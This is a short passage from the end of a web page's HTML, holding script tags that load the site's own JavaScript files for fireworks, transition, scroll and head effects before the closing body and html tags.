src="/js/fireworks.js?version=1.5.6"></script><script src="/js/transition.js?version=1.5.6"></script><script src="/js/scroll.js?version=1.5.6"></script><script src="/js/head.js?version=1.5.6"></script></body></html>